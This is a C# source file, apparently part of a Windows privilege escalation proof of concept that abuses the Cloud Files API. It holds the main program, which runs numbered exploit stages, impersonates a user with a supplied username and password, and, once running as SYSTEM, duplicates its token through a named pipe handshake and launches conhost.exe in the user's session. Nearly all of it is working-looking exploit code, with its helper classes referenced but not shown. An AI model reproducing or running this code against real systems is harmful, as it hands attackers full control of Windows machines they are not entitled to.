    #region Main Program

    static class Program
    {
        static void Main(string[] args)
        {
            Logger.Info("=== Windows Privilege Escalation PoC Started ===");
            Logger.Info(string.Format("Process ID: {0}", Process.GetCurrentProcess().Id));

            try
            {
                // Check if running as SYSTEM
                bool isSystem = CheckIfRunningAsSystem();

                if (isSystem)
                {
                    Logger.Info("Running as SYSTEM - executing elevated payload");
                    ExecuteElevatedPayload();
                    return;
                }

                // Verify Cloud Files API is available
                VerifyCloudFilesApi();

                // Parse command line arguments
                if (args.Length <= 1)
                {
                    int stage = args.Length > 0 ? int.Parse(args[0]) : 0;
                    ExecuteExploitStage(stage);
                }
                else
                {
                    // Alternative execution mode with credentials
                    ExecuteWithCredentials(args[0], args[1]);
                }
            }
            catch (Exception ex)
            {
                Logger.Critical("Fatal error in main execution", ex);
                Environment.Exit(1);
            }

            Logger.Info("=== Execution completed ===");
        }

        private static bool CheckIfRunningAsSystem()
        {
            try
            {
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    bool isSystem = identity.IsSystem;
                    Logger.Info(string.Format("Current identity: {0} (IsSystem: {1})", identity.Name, isSystem));
                    return isSystem;
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to check current identity", ex);
                throw;
            }
        }

        private static void VerifyCloudFilesApi()
        {
            try
            {
                Logger.Debug("Verifying Cloud Files API availability");
                NativeInterop.CF_PLATFORM_INFO platformInfo;
                NativeInterop.CfGetPlatformInfo(out platformInfo).CheckHResult();
                Logger.Info(string.Format("Cloud Files API available - Build: {0}", platformInfo.BuildNumber));
            }
            catch (Exception ex)
            {
                Logger.Critical("Cloud Files API not available", ex);
                throw;
            }
        }

        private static void ExecuteExploitStage(int stage)
        {
            Logger.Info(string.Format("Executing exploit stage: {0}", stage));

            if (stage < 0 || stage >= ExploitConfig.TOTAL_STAGES)
            {
                throw new ArgumentException(string.Format("Invalid stage number: {0}. Must be 0-{1}", stage, ExploitConfig.TOTAL_STAGES - 1));
            }

            var stateMachine = new ExploitStateMachine();
            stateMachine.ExecuteStage(stage);
        }

        private static void ExecuteWithCredentials(string username, string password)
        {
            Logger.Info(string.Format("Executing with credentials for user: {0}", username));

            try
            {
                using (var token = TokenUtils.GetLogonUserToken(username, "", password, SecurityLogonType.Network, null))
                {
                    using (var impersonation = token.Impersonate())
                    {
                        Logger.Info("Impersonation successful - calling CfAbortOperation");
                        NativeInterop.CfAbortOperation(
                            NtProcess.Current.ProcessId,
                            IntPtr.Zero,
                            NativeInterop.AbortHydrationFlags.Block
                        ).CheckHResult();
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to execute with credentials", ex);
                throw;
            }
        }

        private static void ExecuteElevatedPayload()
        {
            try
            {
                // Restore original windir environment variable
                Environment.SetEnvironmentVariable("windir", ExploitConfig.WINDOWS_DIR, EnvironmentVariableTarget.Process);
                Logger.Info("Restored windir environment variable");

                // Connect to named pipe
                Logger.Info(string.Format("Connecting to named pipe: {0}", ExploitConfig.PIPE_NAME));
                using (var pipeClient = new NamedPipeClientStream(ExploitConfig.PIPE_NAME))
                {
                    pipeClient.Connect();

                    // Get session ID from pipe server
                    IntPtr pipeHandle = pipeClient.SafePipeHandle.DangerousGetHandle();
                    uint sessionId;
                    if (!NativeInterop.GetNamedPipeServerSessionId(pipeHandle, out sessionId))
                    {
                        Logger.Error("Failed to get named pipe server session ID");
                        return;
                    }

                    Logger.Info(string.Format("Retrieved session ID: {0}", sessionId));
                    pipeClient.Dispose();

                    // Duplicate and modify token
                    using (var token = NtToken.OpenEffectiveToken())
                    using (var duplicatedToken = token.DuplicateToken())
                    {
                        duplicatedToken.SetSessionId((int)sessionId);
                        Logger.Info(string.Format("Token session ID set to: {0}", sessionId));

                        // Launch elevated process
                        Logger.Info("Launching elevated conhost.exe");
                        Win32Process.CreateProcessAsUser(
                            duplicatedToken,
                            ExploitConfig.CONHOST_PATH,
                            "",
                            CreateProcessFlags.None,
                            null
                        );

                        Logger.Info("Elevated process launched successfully");
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Critical("Failed to execute elevated payload", ex);
                throw;
            }
        }
    }

